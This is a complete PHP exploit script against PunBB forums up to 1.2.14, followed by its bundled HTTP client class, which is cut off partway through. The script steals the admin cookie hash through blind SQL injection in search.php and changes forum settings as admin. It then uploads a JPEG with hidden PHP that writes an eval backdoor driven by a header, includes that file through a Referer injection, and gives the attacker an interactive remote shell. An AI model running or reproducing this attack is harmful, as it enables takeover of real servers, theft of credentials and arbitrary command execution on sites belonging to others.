<html><head><title>PunBB <= 1.2.14 Remote Code Execution Exploit</title></head><pre>#!/usr/bin/php
&lt;?php
error_reporting(E_ALL ^ E_NOTICE);

if($argc &lt; 7)
{
print(&quot;
-----------  PunBB &lt;= 1.2.14 Remote Code Execution Exploit  -----------
-----------------------------------------------------------------------
PHP conditions: See www.acid-root.new.fr/advisories/13070411.txt
       Credits: DarkFig &lt;gmdarkfig@gmail.com&gt;
           URL: http://www.acid-root.new.fr/
-----------------------------------------------------------------------
  Usage: $argv[0] -url &lt;&gt; -usr &lt;&gt; -pwd &lt;&gt; [Options]
 Params: -url       For example http://victim.com/punBB/
         -usr       User account (1 post at least)
         -pwd       Password account
Options: -uid       Admin id (default=2)
         -prefix    Table prefix (default=none)
         -proxy     If you wanna use a proxy &lt;proxyhost:proxyport&gt; 
         -proxyauth Basic authentification &lt;proxyuser:proxypwd&gt;
-----------------------------------------------------------------------
&quot;);exit(1);
}

$url = getparam('url',1);
$usr = getparam('usr',1);
$pwd = getparam('pwd',1);
$uid = (getparam('uid')!='') ? getparam('uid') : 2;
$pre = getparam('prefix');
$prox= getparam('proxy');
$proh= getparam('proxyauth');

$xpl = new phpsploit();
$xpl-&gt;agent(&quot;Mozilla Firefox&quot;);
if(!empty($prox)) $xpl-&gt;addproxy($prox);
if(!empty($proh)) $xpl-&gt;proxyauth($proh);

$xpl-&gt;cookiejar(1);
$xpl-&gt;post($url.'login.php?action=in',&quot;form_sent=1&amp;redirect_url=x&amp;req_username=$usr&amp;req_password=$pwd&amp;login=1&quot;);

print &quot;\nCookie hash: &quot;;$cookie = blind($uid);
print &quot;\nAdmin cookie: &quot;.$cookie;

# Logged in as Administrator
$xpl-&gt;reset('cookie');
$xpl-&gt;addcookie($cookie);

# Avatars dir -&gt; include/user
# Default options (french)
$data =
'form_sent=1&amp;form%5Bboard_title%5D=Mon+forum+punBB&amp;form%5Bboar'
.'d_desc%5D=Malheureusement+personne+ne+peut+vous+dire+ce+que+'
.'PunBB+est+-+vous+devez+le+voir+par+vous-m%EAme.&amp;form%5Bbase_'
.'url%5D='.urlencode(preg_replace(&quot;#(.*)/$#&quot;,&quot;$1&quot;,$url)).'&amp;form%5B'
.'server_timezone%5D=0&amp;form%5Bdefault_lang%5D=English&amp;form%5Bd'
.'efault_style%5D=Oxygen&amp;form%5Btime_format%5D=H%3Ai%3As&amp;form%'
.'5Bdate_format%5D=d-m-Y&amp;form%5Btimeout_visit%5D=600&amp;form%5Bti'
.'meout_online%5D=300&amp;form%5Bredirect_delay%5D=1&amp;form%5Bshow_v'
.'ersion%5D=0&amp;form%5Bshow_user_info%5D=1&amp;form%5Bshow_post_coun'
.'t%5D=1&amp;form%5Bsmilies%5D=1&amp;form%5Bsmilies_sig%5D=1&amp;form%5Bma'
.'ke_links%5D=1&amp;form%5Btopic_review%5D=15&amp;form%5Bdisp_topics_d'
.'efault%5D=30&amp;form%5Bdisp_posts_default%5D=25&amp;form%5Bindent_n'
.'um_spaces%5D=4&amp;form%5Bquickpost%5D=1&amp;form%5Busers_online%5D='
.'1&amp;form%5Bcensoring%5D=0&amp;form%5Branks%5D=1&amp;form%5Bshow_dot%5D'
.'=0&amp;form%5Bquickjump%5D=1&amp;form%5Bgzip%5D=0&amp;form%5Bsearch_all_'
.'forums%5D=1&amp;form%5Badditional_navlinks%5D=&amp;form%5Breport_met'
.'hod%5D=0&amp;form%5Bregs_report%5D=0&amp;form%5Bmailing_list%5D=gmda'
.'rkfig%40gmail.com&amp;form%5Bavatars%5D=1&amp;form%5Bavatars_dir%5D='
.'include%2Fuser&amp;form%5Bavatars_width%5D=60&amp;form%5Bavatars_hei'
.'ght%5D=60&amp;form%5Bavatars_size%5D=10240&amp;form%5Badmin_email%5D'
.'=mysploiti%40gmail.com&amp;form%5Bwebmaster_email%5D=mysploiti%4'
.'0gmail.com&amp;form%5Bsubscriptions%5D=1&amp;form%5Bsmtp_host%5D=&amp;fo'
.'rm%5Bsmtp_user%5D=&amp;form%5Bsmtp_pass%5D=&amp;form%5Bregs_allow%5D'
.'=1&amp;form%5Bregs_verify%5D=0&amp;form%5Brules%5D=0&amp;form%5Brules_me'
.'ssage%5D=Saisissez+vos+r%E8gles+ici.&amp;form%5Bannouncement%5D='
.'0&amp;form%5Bannouncement_message%5D=Saisissez+votre+annonce+ici'
.'.&amp;form%5Bmaintenance%5D=0&amp;form%5Bmaintenance_message%5D=Les+'
.'forums+sont+temporairement+ferm%E9s+pour+des+raisons+de+main'
.'tenance.+Veuillez+essayer+%E0+nouveau+dans+quelques+minutes.'
.'%3Cbr+%2F%3E%0D%0A%3Cbr+%2F%3E%0D%0A%2FAdministrateur&amp;save=+'
.'Enregistrer+';

$xpl-&gt;addheader('Referer',$url.'admin_options.php');
$xpl-&gt;post($url.'admin_options.php?action=foo',$data);


# Fake JPG 1x1
#
# 000000A2 3C3F 7068 7020 2468 616E 646C 653D 666F &lt;?php $handle=fo
# 000000B2 7065 6E28 222E 2F69 6D67 2F61 7661 7461 pen(&quot;./img/avata
# 000000C2 7273 2F62 6163 6B64 6F6F 722E 7068 7022 rs/backdoor.php&quot;
# 000000D2 2C22 7722 293B 2066 7772 6974 6528 2468 ,&quot;w&quot;); fwrite($h
# 000000E2 616E 646C 652C 273C 3F70 6870 2069 6628 andle,'&lt;?php if(
# 000000F2 6973 7365 7428 245F 5345 5256 4552 5B22 isset($_SERVER[&quot;
# 00000102 4854 5450 5F53 4845 4C4C 225D 2929 2040 HTTP_SHELL&quot;])) @
# 00000112 6576 616C 2824 5F53 4552 5645 525B 2248 eval($_SERVER[&quot;H
# 00000122 5454 505F 5348 454C 4C22 5D29 3B20 3F3E TTP_SHELL&quot;]); ?\&gt;
# 00000132 2729 3B20 6663 6C6F 7365 2824 6861 6E64 '); fclose($hand
# 00000142 6C65 293B 203F 3E                       le); ?\&gt;    
$avatar =
&quot;\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x60&quot;
.&quot;\x00\x60\x00\x00\xFF\xDB\x00\x43\x00\x08\x06\x06\x07\x06\x05&quot;
.&quot;\x08\x07\x07\x07\x09\x09\x08\x0A\x0C\x14\x0D\x0C\x0B\x0B\x0C&quot;
.&quot;\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C\x20\x24&quot;
.&quot;\x2E\x27\x20\x22\x2C\x23\x1C\x1C\x28\x37\x29\x2C\x30\x31\x34&quot;
.&quot;\x34\x34\x1F\x27\x39\x3D\x38\x32\x3C\x2E\x33\x34\x32\xFF\xDB&quot;
.&quot;\x00\x43\x01\x09\x09\x09\x0C\x0B\x0C\x18\x0D\x0D\x18\x32\x21&quot;
.&quot;\x1C\x21\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32&quot;
.&quot;\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32&quot;
.&quot;\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32&quot;
.&quot;\x32\x32\x32\x32\x32\x32\x32\xFF\xFE\x00\xA9\x3C\x3F\x70\x68&quot;
.&quot;\x70\x20\x24\x68\x61\x6E\x64\x6C\x65\x3D\x66\x6F\x70\x65\x6E&quot;
.&quot;\x28\x22\x2E\x2F\x69\x6D\x67\x2F\x61\x76\x61\x74\x61\x72\x73&quot;
.&quot;\x2F\x62\x61\x63\x6B\x64\x6F\x6F\x72\x2E\x70\x68\x70\x22\x2C&quot;
.&quot;\x22\x77\x22\x29\x3B\x20\x66\x77\x72\x69\x74\x65\x28\x24\x68&quot;
.&quot;\x61\x6E\x64\x6C\x65\x2C\x27\x3C\x3F\x70\x68\x70\x20\x69\x66&quot;
.&quot;\x28\x69\x73\x73\x65\x74\x28\x24\x5F\x53\x45\x52\x56\x45\x52&quot;
.&quot;\x5B\x22\x48\x54\x54\x50\x5F\x53\x48\x45\x4C\x4C\x22\x5D\x29&quot;
.&quot;\x29\x20\x40\x65\x76\x61\x6C\x28\x24\x5F\x53\x45\x52\x56\x45&quot;
.&quot;\x52\x5B\x22\x48\x54\x54\x50\x5F\x53\x48\x45\x4C\x4C\x22\x5D&quot;
.&quot;\x29\x3B\x20\x3F\x3E\x27\x29\x3B\x20\x66\x63\x6C\x6F\x73\x65&quot;
.&quot;\x28\x24\x68\x61\x6E\x64\x6C\x65\x29\x3B\x20\x3F\x3E\xFF\xC0&quot;
.&quot;\x00\x11\x08\x00\x01\x00\x01\x03\x01\x22\x00\x02\x11\x01\x03&quot;
.&quot;\x11\x01\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01&quot;
.&quot;\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06&quot;
.&quot;\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x10\x00\x02\x01\x03\x03&quot;
.&quot;\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7D\x01\x02\x03\x00&quot;
.&quot;\x04\x11\x05\x12\x21\x31\x41\x06\x13\x51\x61\x07\x22\x71\x14&quot;
.&quot;\x32\x81\x91\xA1\x08\x23\x42\xB1\xC1\x15\x52\xD1\xF0\x24\x33&quot;
.&quot;\x62\x72\x82\x09\x0A\x16\x17\x18\x19\x1A\x25\x26\x27\x28\x29&quot;
.&quot;\x2A\x34\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49&quot;
.&quot;\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68&quot;
.&quot;\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x83\x84\x85\x86\x87&quot;
.&quot;\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4&quot;
.&quot;\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA&quot;
.&quot;\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7&quot;
.&quot;\xD8\xD9\xDA\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2&quot;
.&quot;\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xC4\x00\x1F\x01\x00\x03&quot;
.&quot;\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00&quot;
.&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5&quot;
.&quot;\x11\x00\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\x00\x01&quot;
.&quot;\x02\x77\x00\x01\x02\x03\x11\x04\x05\x21\x31\x06\x12\x41\x51&quot;
.&quot;\x07\x61\x71\x13\x22\x32\x81\x08\x14\x42\x91\xA1\xB1\xC1\x09&quot;
.&quot;\x23\x33\x52\xF0\x15\x62\x72\xD1\x0A\x16\x24\x34\xE1\x25\xF1&quot;
.&quot;\x17\x18\x19\x1A\x26\x27\x28\x29\x2A\x35\x36\x37\x38\x39\x3A&quot;
.&quot;\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59&quot;
.&quot;\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78&quot;
.&quot;\x79\x7A\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95&quot;
.&quot;\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2&quot;
.&quot;\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8&quot;
.&quot;\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE2\xE3\xE4\xE5&quot;
.&quot;\xE6\xE7\xE8\xE9\xEA\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF&quot;
.&quot;\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00\xF7\xFA&quot;
.&quot;\x28\xA2\x80\x3F\xFF\xD9&quot;;

# Upload
$formdata = array(frmdt_url =&gt; $url.'profile.php?action=upload_avatar2&amp;id='.$uid,
                  'form_sent' =&gt; '1',
                  'MAX_FILE_SIZE' =&gt; '10240',
                  'upload' =&gt; 'Télécharger',
                  'req_file' =&gt; array(frmdt_filename =&gt; 'pic.jpg',
                                      frmdt_type =&gt; 'image/jpeg',
                                      frmdt_content =&gt; $avatar));

$xpl-&gt;addheader('Referer',$url.'profile.php');
$xpl-&gt;formdata($formdata);

# File inclusion
$xpl-&gt;addheader('Referer',$url.&quot;misc.php\&quot;&gt;&lt;pun_include \&quot;$uid.jpg\&quot;&gt;&quot;);
$xpl-&gt;get($url.'misc.php?email='.$uid);
print &quot;\nThe php code shoulb be executed\n\$shell&gt; &quot;;

# Hello 
while(!preg_match(&quot;#^(quit|exit)$#&quot;,($cmd = trim(fgets(STDIN)))))
{
    # ');include('../../config.php');print $db_password;//
    $xpl-&gt;addheader('Shell',&quot;system('$cmd');&quot;);
    $xpl-&gt;get($url.'img/avatars/backdoor.php');
    print $xpl-&gt;getcontent().&quot;\n\$shell&gt; &quot;;
}

function blind($id)
{
	global $xpl,$url,$usr,$pre;
	
	preg_match(&quot;#^(\S*)=(\S*);#&quot;,$xpl-&gt;showcookie(),$cookies);
	$name=$cookies[1].&quot;=&quot;;
	$string=&quot;a:2:{i:0;s:1:\&quot;$id\&quot;;i:1;s:32:\&quot;&quot;;
	
	for($i=1;$i&lt;=32;$i++)
	{
		$charset = '0123456789abcdef';
		for($a=0;$a&lt;=strlen($charset);$a++)
		{
			# Search cache
			$searchd = 'search.php?action=search&amp;keywords=*****&amp;author='
			          .$usr.'&amp;forum=-1&amp;search_in=all&amp;sort_by=0&amp;sort_dir=DESC&amp;show_as=topics&amp;search=1';
			$xpl-&gt;get($url.$searchd);

			# Cookie hash
			$sql = 'ORD(SUBSTR(('
			      .'SELECT MD5('
			      .'CONCAT('
			      .'SUBSTR('
			      .'MD5('
			      # Cookie seed
			      .'(SELECT registered FROM '.$pre.'users WHERE LENGTH(registered)=10'
			      .' ORDER BY registered LIMIT 1)),-8),'
			      # Hashed password
			      .'(SELECT password FROM '.$pre.'users WHERE id='.$id.')))),'.$i.',1))=ORD(CHAR('.ord($charset[$a]).')) #';
			      
			# SQL Injection
			$xpl-&gt;post($url.'search.php?action=show_new','search_id=-1 OR '.$sql.'&amp;1986084953=1&amp;-1234899993=1');
			
			# True
			if(preg_match('#&lt;th class=&quot;tcr&quot; scope=&quot;col&quot;&gt;#',$xpl-&gt;getcontent()))
			{
				print $charset[$a];
				$string .= $charset[$a];
				break;
			}
		}
	}
	return $name.urlencode($string.'&quot;;}');
}

function getparam($param,$opt='')
{
	global $argv;
	foreach($argv as $value =&gt; $key)
	{
		if($key == '-'.$param) return $argv[$value+1];
	}
	if($opt) exit(&quot;\n#3 -$param parameter required&quot;);
	else return;
}

/*
 * 
 * Copyright (C) darkfig
 * 
 * This program is free software; you can redistribute it and/or 
 * modify it under the terms of the GNU General Public License 
 * as published by the Free Software Foundation; either version 2 
 * of the License, or (at your option) any later version. 
 * 
 * This program is distributed in the hope that it will be useful, 
 * but WITHOUT ANY WARRANTY; without even the implied warranty of 
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 * GNU General Public License for more details. 
 * 
 * You should have received a copy of the GNU General Public License 
 * along with this program; if not, write to the Free Software 
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 * 
 * TITLE:          PhpSploit Class
 * REQUIREMENTS:   PHP 5 (remove &quot;private&quot;, &quot;public&quot; if you have PHP 4)
 * VERSION:        1.2
 * LICENSE:        GNU General Public License
 * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
 * FILENAME:       phpsploitclass.php
 *
 * CONTACT:        gmdarkfig@gmail.com (french / english)
 * GREETZ:         Sparah, Ddx39
 *
 * DESCRIPTION:
 * The phpsploit is a class implementing a web user agent.
 * You can add cookies, headers, use a proxy server with (or without) a
 * basic authentification. It supports the GET and the POST method. It can
 * also be used like a browser with the cookiejar() function (which allow
 * a server to add several cookies for the next requests) and the
 * allowredirection() function (which allow the script to follow all
 * redirections sent by the server). It can return the content (or the
 * headers) of the request. Others useful functions can be used for debugging.
 * A manual is actually in development but to know how to use it, you can
 * read the comments.
 *
 * CHANGELOG:
 * [2007-01-24] (1.2)
 *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))
 *  * New: multipart/form-data enctype is now supported 
 *
 * [2006-12-31] (1.1)
 *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
 *  * New: You can now call the getheader() / getcontent() function without parameters
 *
 * [2006-12-30] (1.0)
 *  * First version
 * 
 */

class phpsploit {

	/**
	 * This function is called by the get()/post() functions.
	 * You don't have to call it, this is the main function.
	 *
	 * @return $server_response
	 */
	private function sock()
	{
		if(!empty($this-&gt;proxyhost) &amp;&amp; !empty($this-&gt;proxyport)) $socket = fsockopen($this-&gt;proxyhost,$this-&gt;proxyport);
		else $socket = fsockopen($this-&gt;host,$this-&gt;port);
		
		if(!$socket) die(&quot;Error: The host doesn't exist&quot;);
		
		if($this-&gt;method===&quot;get&quot;) $this-&gt;packet = &quot;GET &quot;.$this-&gt;url.&quot; HTTP/1.1\r\n&quot;;
		elseif($this-&gt;method===&quot;post&quot; or $this-&gt;method===&quot;formdata&quot;) $this-&gt;packet = &quot;POST &quot;.$this-&gt;url. &quot; HTTP/1.1\r\n&quot;;
		else die(&quot;Error: Invalid method&quot;);
		
		if(!empty($this-&gt;proxyuser)) $this-&gt;packet .= &quot;Proxy-Authorization: Basic &quot;.base64_encode($this-&gt;proxyuser.&quot;:&quot;.$this-&gt;proxypass).&quot;\r\n&quot;;
		$this-&gt;packet .= &quot;Host: &quot;.$this-&gt;host.&quot;\r\n&quot;;
		
		if(!empty($this-&gt;agent))  $this-&gt;packet .= &quot;User-Agent: &quot;.$this-&gt;agent.&quot;\r\n&quot;;
		if(!empty($this-&gt;header)) $this-&gt;packet .= $this-&gt;header.&quot;\r\n&quot;;
		if(!empty($this-&gt;cookie)) $this-&gt;packet .= &quot;Cookie: &quot;.$this-&gt;cookie.&quot;\r\n&quot;;
		
		$this-&gt;packet .= &quot;Connection: Close\r\n&quot;;
		if($this-&gt;method===&quot;post&quot;)
		{
			$this-&gt;packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
			$this-&gt;packet .= &quot;Content-Length: &quot;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data.&quot;\r\n&quot;;
		}
		elseif($this-&gt;method===&quot;formdata&quot;)
		{
			$this-&gt;packet .= &quot;Content-Type: multipart/form-data; boundary=---------------------------&quot;.$this-&gt;boundary.&quot;\r\n&quot;;
			$this-&gt;packet .= &quot;Content-Length: &quot;.strlen($this-&gt;data).&quot;\r\n\r\n&quot;;
			$this-&gt;packet .= $this-&gt;data;
		}
		$this-&gt;packet .= &quot;\r\n&quot;;
		$this-&gt;recv = '';
		
		fputs($socket,$this-&gt;packet);
		while(!feof($socket)) $this-&gt;recv .= fgets($socket);
		fclose($socket);
		
		if($this-&gt;cookiejar) $this-&gt;cookiejar($this-&gt;getheader($this-&gt;recv));
		if($this-&gt;allowredirection) return $this-&gt;allowredirection($this-&gt;recv);
		else return $this-&gt;recv;
	}
	

	/**
	 * This function allows you to add several cookie in the
	 * request. Several methods are supported:
	 * 
	 * $this-&gt;addcookie(&quot;name&quot;,&quot;value&quot;);
	 * or
	 * $this-&gt;addcookie(&quot;name=newvalue&quot;);
	 * or
	 * $this-&gt;addcookie(&quot;othername=overvalue; xx=zz; y=u&quot;);
	 * 
	 * @param string $cookiename
	 * @param string $cookievalue
	 * 
	 */
	public function addcookie($cookn,$cookv='')
	{
		// $this-&gt;addcookie(&quot;name&quot;,&quot;value&quot;); work avec replace
		if(!empty($cookv))
		{
			if($cookv === &quot;deleted&quot;) $cookv=''; // cookiejar(1) &amp;&amp; Set-Cookie: name=delete
			if(!empty($this-&gt;cookie))
			{
			    if(preg_match(&quot;/$cookn=/&quot;,$this-&gt;cookie))
			    {
			    	$this-&gt;cookie = preg_replace(&quot;/$cookn=(\S*);/&quot;,&quot;$cookn=$cookv;&quot;,$this-&gt;cookie);
			    }
			    else
			    {
			    	$this-&gt;cookie .= &quot; &quot;.$cookn.&quot;=&quot;.$cookv.&quot;;&quot;; // &quot; &quot;.
			    }
			}
			else
			{
				$this-&gt;cookie = $cookn.&quot;=&quot;.$cookv.&quot;;&quot;;
			}
		}
		// $this-&gt;addcookie(&quot;name=value; othername=othervalue&quot;);
		else
		{
	    	 if(!empty($this-&gt;cookie))
	    	 {
	    	 	$cookn = preg_replace(&quot;/(.*);$/&quot;,&quot;$1&quot;,$cookn);
	    	 	$cookarr = explode(&quot;;&quot;,str_replace(&quot; &quot;, &quot;&quot;,$cookn));
	    	 	for($i=0;$i&lt;count($cookarr);$i++)
	    	 	{
	    	 		preg_match(&quot;/(\S*)=(\S*)/&quot;,$cookarr[$i],$matches);
	    	 		$cookn = $matches[1];
	    	 		$cookv = $matches[2];
	    	 		$this-&gt;addcookie($cookn,$cookv);
	    	 	}
	    	 }
			 else
			 {
			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))===&quot;;&quot;) ? $cookn : $cookn.&quot;;&quot;;
			 	$this-&gt;cookie = $cookn;			
			 }
		}
	}
	
	
	/**
	 * This function allows you to add several headers in the
	 * request. Several methods are supported:
	 *
	 * $this-&gt;addheader(&quot;headername&quot;,&quot;headervalue&quot;);
	 * or
	 * $this-&gt;addheader(&quot;headername: headervalue&quot;);
	 *
	 * @param string $headername
	 * @param string $headervalue
	 */
	public function addheader($headern,$headervalue='')
	{
		// $this-&gt;addheader(&quot;name&quot;,&quot;value&quot;);
		if(!empty($headervalue))
		{
			if(!empty($this-&gt;header))
			{
				if(preg_match(&quot;/$headern:/&quot;,$this-&gt;header))
				{
					$this-&gt;header = preg_replace(&quot;/$headern: (\S*)/&quot;,&quot;$headern: $headervalue&quot;,$this-&gt;header);
				}
				else
				{
					$this-&gt;header .= &quot;\r\n&quot;.$headern.&quot;: &quot;.$headervalue;
				}
			}
			else
			{
				$this-&gt;header=$headern.&quot;: &quot;.$headervalue;
			}
		}
		// $this-&gt;addheader(&quot;name: value&quot;);
		else 
		{
			if(!empty($this-&gt;header))
			{
				$headarr = explode(&quot;: &quot;,$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this-&gt;addheader($headern,$headerv);
			}
			else
			{
				$this-&gt;header=$headern;
			}
		}
	}
	

	/**
	 * This function allows you to use an http proxy server.
	 * Several methods are supported:
	 * 
	 * $this-&gt;proxy(&quot;proxyip&quot;,&quot;8118&quot;);
	 * or
	 * $this-&gt;proxy(&quot;proxyip:8118&quot;)
	 *
	 * @param string $proxyhost
	 * @param integer $proxyport
	 */
	public function proxy($proxy,$proxyp='')
	{
		// $this-&gt;proxy(&quot;localhost:8118&quot;);
		if(empty($proxyp))
		{
			preg_match(&quot;/^(\S*):(\d+)$/&quot;,$proxy,$proxarr);
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this-&gt;proxyhost=$proxh;
			$this-&gt;proxyport=$proxp;
		}
		// $this-&gt;proxy(&quot;localhost&quot;,8118);
		else 
		{
			$this-&gt;proxyhost=$proxy;
			$this-&gt;proxyport=intval($proxyp);
		}
		if($this-&gt;proxyport &gt; 65535) die(&quot;Error: Invalid port number&quot;);
	}
	

	/**
	 * This function allows you to use an http proxy server
	 * which requires a basic authentification. Several
	 * methods are supported:
	 * 
	 * $this-&gt;proxyauth(&quot;darkfig&quot;,&quot;dapasswd&quot;);
	 * or
	 * $this-&gt;proxyauth(&quot;darkfig:dapasswd&quot;);
	 *
	 * @param string $proxyuser
	 * @param string $proxypass
	 */
	public function proxyauth($proxyauth,$proxypasse='')
	{
		// $this-&gt;proxyauth(&quot;darkfig:password&quot;);
		if(empty($proxypasse))
		{
			preg_match(&quot;/^(.*):(.*)$/&quot;,$proxyauth,$proxautharr);
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this-&gt;proxyuser=$proxu;
			$this-&gt;proxypass=$proxp;
		}
		// $this-&gt;proxyauth(&quot;darkfig&quot;,&quot;password&quot;);
		else
		{
			$this-&gt;proxyuser=$proxyauth;
			$this-&gt;proxypass=$proxypasse;
		}
	}

	
	/**
	 * This function allows you to set the &quot;User-Agent&quot; header.
	 * Several methods are possible to do that:
	 * 
	 * $this-&gt;agent(&quot;Mozilla Firefox&quot;);
	 * or
	 * $this-&gt;addheader(&quot;User-Agent: Mozilla Firefox&quot;);
	 * or
	 * $this-&gt;addheader(&quot;User-Agent&quot;,&quot;Mozilla Firefox&quot;);
	 * 
	 * @param string $useragent
	 */
	public function agent($useragent)
	{
		$this-&gt;agent=$useragent;
	}

	
	/**
	 * This function returns the header which will be
	 * in the next request.
	 * 
	 * $this-&gt;showheader();
	 *
	 * @return $header
	 */
	public function showheader()
	{
		return $this-&gt;header;
	}

	
	/**
	 * This function returns the cookie which will be
	 * in the next request.
	 * 
	 * $this-&gt;showcookie();
	 *
	 * @return $storedcookies
	 */
	public function showcookie()
	{
		return $this-&gt;cookie;
	}

	
	/**
	 * This function returns the last formed
	 * http request (the http packet).
	 * 
	 * $this-&gt;showlastrequest();
	 * 
	 * @return $last_http_request
	 */
	public function showlastrequest()
	{
		return $this-&gt;packet;
	}
	
	
	/**
	 * This function sends the formed http packet with the
	 * GET method. You can precise the port of the host.
	 * 
	 * $this-&gt;get(&quot;http://localhost&quot;);
	 * $this-&gt;get(&quot;http://localhost:888/xd/tst.php&quot;);
	 * 
	 * @param string $urlwithpath
	 * @return $server_response
	 */
	public function get($url)
	{
		$this-&gt;target($url);
		$this-&gt;method=&quot;get&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function sends the formed http packet with the
	 * POST method. You can precise the port of the host.
	 * 
	 * $this-&gt;post(&quot;http://localhost/index.php&quot;,&quot;admin=1&amp;user=dark&quot;);
	 *
	 * @param string $urlwithpath
	 * @param string $postdata
	 * @return $server_response
	 */	
	public function post($url,$data)
	{
		$this-&gt;target($url);
		$this-&gt;method=&quot;post&quot;;
		$this-&gt;data=$data;
		return $this-&gt;sock();
	}
	

	/**
	 * This function sends the formed http packet with the
	 * POST method using the multipart/form-data enctype. 
	 * 
	 * $array = array(
	 *          frmdt_url      =&gt; &quot;http://localhost/upload.php&quot;,
	 *          frmdt_boundary =&gt; &quot;123456&quot;,                    # Optional
	 *                 &quot;email&quot; =&gt; &quot;me@u.com&quot;,
	 *               &quot;varname&quot; =&gt; array(
	 *                            frmdt_type =&gt; &quot;image/gif&quot;,   # Optional
	 *                       frmdt_transfert =&gt; &quot;binary&quot;,      # Optional
	 *                        frmdt_filename =&gt; &quot;hello.php&quot;,
	 *                         frmdt_content =&gt; &quot;&lt;?php echo ':)'; ?&gt;&quot;));
	 * $this-&gt;formdata($array);
	 *
	 * @param array $array
	 * @return $server_response
	 */
	public function formdata($array)
	{
		$this-&gt;target($array[frmdt_url]);
		$this-&gt;method=&quot;formdata&quot;;
		$this-&gt;data='';
		if(!isset($array[frmdt_boundary])) $this-&gt;boundary=&quot;phpsploit&quot;;
		else $this-&gt;boundary=$array[frmdt_boundary];
		foreach($array as $key =&gt; $value)
		{
			if(!preg_match(&quot;#^frmdt_(boundary|url)#&quot;,$key))
			{
				$this-&gt;data .= &quot;-----------------------------&quot;.$this-&gt;boundary.&quot;\r\n&quot;;
				$this-&gt;data .= &quot;Content-Disposition: form-data; name=\&quot;&quot;.$key.&quot;\&quot;;&quot;;
				if(!is_array($value))
				{
					$this-&gt;data .= &quot;\r\n\r\n&quot;.$value.&quot;\r\n&quot;;
				}
				else
				{
					$this-&gt;data .= &quot; filename=\&quot;&quot;.$array[$key][frmdt_filename].&quot;\&quot;;\r\n&quot;;
					if(isset($array[$key][frmdt_type])) $this-&gt;data .= &quot;Content-Type: &quot;.$array[$key][frmdt_type].&quot;\r\n&quot;;
					if(isset($array[$key][frmdt_transfert])) $this-&gt;data .= &quot;Content-Transfer-Encoding: &quot;.$array[$key][frmdt_transfert].&quot;\r\n&quot;;
					$this-&gt;data .= &quot;\r\n&quot;.$array[$key][frmdt_content].&quot;\r\n&quot;;
				}
			}
		}
		$this-&gt;data .= &quot;-----------------------------&quot;.$this-&gt;boundary.&quot;--\r\n&quot;;
		return $this-&gt;sock();
	}

	
	/**
	 * This function returns the content of the server response
	 * without the headers.
	 * 
	 * $this-&gt;getcontent($this-&gt;get(&quot;http://localhost/&quot;));
	 * or
	 * $this-&gt;getcontent();
	 *
	 * @param string $server_response
	 * @return $onlythecontent
	 */
	public function getcontent($code='')
	{
		if(empty($code)) $code = $this-&gt;recv;
		$content = explode(&quot;\n&quot;,$code);
		$onlycode = '';
		for($i=1;$i&lt;count($content);$i++)
		{
			if(!preg_match(&quot;/^(\S*):/&quot;,$content[$i])) $ok = 1;
			if($ok) $onlycode .= $content[$i].&quot;\n&quot;;
		}
		return $onlycode;
	}

	
	/**
	 * This function returns the headers of the server response
	 * without the content.
	 * 
	 * $this-&gt;getheader($this-&gt;post(&quot;http://localhost/x.php&quot;,&quot;x=1&amp;z=2&quot;));
	 * or
	 * $this-&gt;getheader();
	 *
	 * @param string $server_response
	 * @return $onlytheheaders
	 */
	public function getheader($code='')
	{
		if(empty($code)) $code = $this-&gt;recv;
		$header = explode(&quot;\n&quot;,$code);
